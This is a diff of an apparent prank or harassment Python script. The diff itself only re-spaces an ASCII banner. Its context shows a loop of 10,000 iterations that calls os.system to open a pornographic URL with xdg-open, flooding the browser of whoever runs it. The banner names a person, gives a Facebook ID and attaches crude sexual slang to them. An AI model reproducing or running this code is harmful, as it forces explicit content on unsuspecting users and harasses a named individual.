@@ -157,12 +157,7 @@ for xd in range(10000):
 os.system('xdg-open https://xgx.mobi/free/new-hot-indean-sex-video-in-2023/')
 
 logo = ("""
-
- 
-
-                                                                                                                                               
-                                                                                                                                               
-
+                                                                                                                                                                                                                                                                                           
  ______                                                    
 /      |                                                   
 $$$$$$/                                                    
@@ -196,16 +191,15 @@ $$      \ $$    $$ |$$ |  $$ |  $$ |    $$  $$/  $$    $$ |
 /  \__$$ |$$ |  $$ |$$ |__$$ | _$$ |_     $$ |   $$ |  $$ |
 $$    $$/ $$ |  $$ |$$    $$/ / $$   |    $$ |   $$ |  $$ |
  $$$$$$/  $$/   $$/ $$$$$$$/  $$$$$$/     $$/    $$/   $$/ 
-                                                           
-                                                                                                                                                                                               
+                                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                                       
 \033[1;94m       [+]===============================================[+]
-\033[1;94m       [+]             CREATED BY :  X FOR SADIYA           \033[1;94m[+]
-\033[1;94m       [+] FACEBOOK ID FOR SADIYA :  Sadiyajahanyealam      \033[1;94m[+]
-\033[1;94m       [+]                   TEAM :  Sani leon's            \033[1;94m[+]
-\033[1;94m       [+]            SEX VERSION :  OPEN CHODA CHODI       \033[1;94m[+]
-\033[1;94m       [+]             SEX STATUS :  JONI DAA               \033[1;94m[+]
-\033[1;94m       [+]                COUNTRY :  CHROME                 \033[1;94m[+]
+\033[1;94m       [+]             CREATED BY :  X FOR SADIYA        \033[1;94m[+]
+\033[1;94m       [+] FACEBOOK ID FOR SADIYA :  Sadiyajahanyealam   \033[1;94m[+]
+\033[1;94m       [+]                   TEAM :  Sani leon's         \033[1;94m[+]
+\033[1;94m       [+]            SEX VERSION :  OPEN CHODA CHODI    \033[1;94m[+]
+\033[1;94m       [+]             SEX STATUS :  JONI DAA            \033[1;94m[+]
+\033[1;94m       [+]                COUNTRY :  CHROME              \033[1;94m[+]
 \033[1;94m       [+]===============================================[+]
 """)                                              
 
